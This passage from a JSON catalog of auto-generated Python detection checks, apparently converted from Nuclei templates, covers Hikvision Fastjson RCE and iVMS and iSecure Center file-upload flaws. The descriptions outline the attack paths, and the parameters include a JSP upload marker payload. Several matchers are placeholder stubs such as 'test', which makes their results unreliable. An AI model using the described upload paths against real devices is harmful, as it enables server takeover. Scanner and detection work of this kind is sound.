help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_fastjson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "hikvision",
          "fastjson",
          "rce",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_hikvision_ivms_file_upload_bypass",
        "name": "Hikvison iVMS - File Upload Bypass",
        "language": "Python",
        "famille": "WebApp",
        "description": "Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the \"/resourceOperations/upload\" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.",
        "severity": "critical",
        "detection": "[OR] mot(s) '\"success\":true, \"resourceName\":'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-ivms-file-upload-bypass\nName: Hikvison iVMS - File Upload Bypass\nSeverity: critical\nDescription: Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the \"/resourceOperations/upload\" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_ivms_file_upload_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-ivms-file-upload-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvison iVMS - File Upload Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'\"success\":true, \"resourceName\":\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":true, \"resourceName\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvison iVMS - File Upload Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_ivms_file_upload_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-ivms-file-upload-bypass\nName: Hikvison iVMS - File Upload Bypass\nSeverity: critical\nDescription: Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the \"/resourceOperations/upload\" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_ivms_file_upload_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-ivms-file-upload-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvison iVMS - File Upload Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'\"success\":true, \"resourceName\":\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":true, \"resourceName\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvison iVMS - File Upload Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_ivms_file_upload_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "hikvision",
          "ivms",
          "intrusive",
          "fileupload",
          "auth-bypass",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_hikvision_ivms_file_upload_rce",
        "name": "Hikvision iVMS-8700 - File Upload Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.",
        "severity": "critical",
        "detection": "[OR] DSL: body_2 == str2",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "str1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: str1",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "str2",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: str2",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "str3",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: str3",
            "default": "<%out.print(\"{{str2}}\");%>"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-ivms-file-upload-rce\nName: Hikvision iVMS-8700 - File Upload Remote Code Execution\nSeverity: critical\nDescription: Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_ivms_file_upload_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-ivms-file-upload-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvision iVMS-8700 - File Upload Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: body_2 == str2'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvision iVMS-8700 - File Upload Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_ivms_file_upload_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-ivms-file-upload-rce\nName: Hikvision iVMS-8700 - File Upload Remote Code Execution\nSeverity: critical\nDescription: Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_ivms_file_upload_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-ivms-file-upload-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvision iVMS-8700 - File Upload Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: body_2 == str2'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvision iVMS-8700 - File Upload Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_ivms_file_upload_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "hikvision",
          "ivms",
          "fileupload",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_hikvision_js_files_upload",
        "name": "Hikvision iSecure Center - File Upload",
        "language": "Python",
        "famille": "IoT",
        "description": "THikvision iSecure Center /center/api/files;.js has an arbitrary file upload vulnerability",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_2 == 200; contains(body_2, \"{{payload}}\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "print",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: print",
            "default": "<%out.print(\"{{payload}}\");%>"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-js-files-upload\nName: Hikvision iSecure Center - File Upload\nSeverity: critical\nDescription: THikvision iSecure Center /center/api/files;.js has an arbitrary file upload vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_js_files_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-js-files-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvision iSecure Center - File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(body_2, \"{{payload}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: 